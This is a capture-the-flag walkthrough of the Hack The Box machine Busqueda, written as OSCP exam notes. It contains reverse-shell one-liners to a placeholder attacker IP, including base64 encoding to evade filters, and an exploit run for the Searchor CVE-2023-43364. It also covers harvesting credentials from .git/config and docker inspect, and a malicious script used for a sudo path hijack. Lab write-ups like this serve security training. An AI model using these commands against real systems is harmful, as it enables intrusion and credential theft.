# Busqueda — HTB (TJ Null OSCP List)

| Detail       | Value                          |
|--------------|--------------------------------|
| **IP**       | 10.129.228.217                 |
| **Hostname** | searcher.htb                   |
| **OS**       | Linux                          |
| **Difficulty** | Easy                         |
| **Key Skills** | CVE exploitation, Git credential leakage, Docker inspection, Sudo path hijack |

---

## 1. Enumeration

### Virtual Host
```
10.129.228.217 -> searcher.htb
```
Add to `/etc/hosts`.

### Web Application Fingerprinting
- Page source reveals **Searchor 2.4.0**
- This version is vulnerable to **CVE-2023-43364** — Remote Code Execution via unsanitized `eval()` in the search query handler

---

## 2. Initial Foothold — CVE-2023-43364 (Searchor RCE)

**Vulnerability:** Searchor 2.4.0 passes user input directly into Python `eval()`, allowing arbitrary command execution.

### Confirm RCE
```bash
python CVE-2023-43364.py http://searcher.htb/search -a "id"
# uid=1000(svc) gid=1000(svc) groups=1000(svc)
```

### Reverse Shell
```bash
# Encode payload to avoid bad characters
echo -n "bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1" | base64

# Execute via CVE exploit
python CVE-2023-43364.py http://searcher.htb/search -a \
  'echo "<BASE64_PAYLOAD>" | base64 -d | bash'
```

> **OSCP Technique — Base64 shell encoding:**
> When injecting reverse shells through exploits that mangle special characters (`>`, `&`, `|`), base64-encode the payload and pipe through `base64 -d | bash`. This bypasses most character filtering.

**Shell as:** `svc`

---

## 3. Post-Exploitation Enumeration — Git Credential Leak

### Finding the .git directory
```bash
ls -la /var/www/app/
# .git directory present
```

### Extracting credentials from Git config
```bash
cat /var/www/app/.git/config
```
The `[remote "origin"]` URL contains **embedded credentials**:
```
http://cody:<PASSWORD>@gitea.searcher.htb/cody/Searcher_site.git
```

> **OSCP Technique — Git credential harvesting:**
> Always check `.git/config` for hardcoded credentials in remote URLs. Developers frequently embed creds in `http://user:pass@host` format. Also check:
> - `.git/config` — remote URLs with embedded creds
> - `.git-credentials` — plaintext credential store
> - `.gitconfig` — user-level config
> - Commit history (`git log -p`) — passwords in old commits

### Credential Reuse
The password from the Git config also works as the `svc` user's system password (credential reuse).

---

## 4. Privilege Escalation — Sudo + Docker Inspect + Path Hijack

### Step 1: Check sudo permissions
```bash
sudo -l
# (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```
The wildcard `*` means we control the arguments passed to the script.

### Step 2: Enumerate the script's capabilities
```bash
sudo python3 /opt/scripts/system-checkup.py help
# docker-ps      : List running docker containers
# docker-inspect : Inspect a certain docker container
# full-checkup   : Run a full system checkup
```

### Step 3: Extract secrets via Docker inspect
```bash
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea
```
Leaked environment variables from the Gitea container:
```
GITEA__database__HOST=db:3306
GITEA__database__NAME=gitea
GITEA__database__USER=gitea
GITEA__database__PASSWD=<DB_PASSWORD>
```

> **OSCP Technique — Docker inspect for secrets:**
> `docker inspect` dumps the full container config including env vars. Databases, API keys, and internal service passwords are almost always in env vars. Format templates help extract specific fields:
> ```bash
> docker inspect --format='{{json .Config.Env}}' <container>
> docker inspect --format='{{json .NetworkSettings}}' <container>
> ```

### Step 4: Access the database (optional lateral path)
```bash
mysql -h 127.0.0.1 -u gitea -p<DB_PASSWORD>
```
```sql
SHOW DATABASES;
USE gitea;
SHOW TABLES;
SELECT * FROM user;
```

### Step 5: Root via relative path hijack in `full-checkup`
The `system-checkup.py` script calls `full-checkup.sh` using a **relative path** (not absolute). By creating our own `full-checkup.sh` in the current directory, it gets executed as root.

```bash
# Create malicious full-checkup.sh in current directory
cat > full-checkup.sh << 'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/9002 0>&1'
EOF

chmod +x full-checkup.sh

# Trigger it via sudo — runs OUR script as root
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

> **OSCP Technique — Relative path hijack with sudo:**
> When a sudo-allowed script calls another script/binary by **relative path** (e.g., `./full-checkup.sh` instead of `/opt/scripts/full-checkup.sh`), you can hijack it:
> 1. Create a malicious file with the same name in your writable CWD
> 2. Make it executable
> 3. Run the sudo command from that directory
>
> The script resolves the relative path from CWD, executing your payload as root.

**Shell as:** `root`

---

## 5. Attack Chain Summary

```
Searchor 2.4.0 (CVE-2023-43364 RCE)
    |
    v
Shell as svc
    |
    v
.git/config credential leak --> cody's password --> reused for svc sudo
    |
    v
sudo system-checkup.py --> docker-inspect --> DB creds (lateral)
    |
    v
sudo system-checkup.py full-checkup --> relative path hijack --> root
```

---

## 6. OSCP Exam Takeaways

| Lesson | Detail |
|--------|--------|
| **Always check app version** | Page source, headers, `/about`, footer — then search for CVEs |
| **Base64 encode reverse shells** | Avoids character mangling in exploit payloads |
| **Hunt for .git in webroot** | `ls -la` every directory after landing — `.git` is a goldmine |
| **Git remotes leak creds** | `cat .git/config` — look for `http://user:pass@` URLs |
| **Try credential reuse everywhere** | Same password for system login, DB, other services |
| **Docker inspect = secret dump** | Env vars in containers often hold DB passwords, API keys |
| **Relative path in sudo = hijack** | If a sudo script calls something by relative path, you control it from CWD |

---

## 7. Commands Quick Reference

```bash
# CVE RCE
python CVE-2023-43364.py http://searcher.htb/search -a "id"

# Base64 reverse shell
echo -n "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1" | base64
echo "BASE64" | base64 -d | bash

# Git cred leak
cat .git/config
git log -p  # check commit history too

# Docker inspect
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea

# Path hijack
echo '#!/bin/bash' > full-checkup.sh
echo 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' >> full-checkup.sh
chmod +x full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```
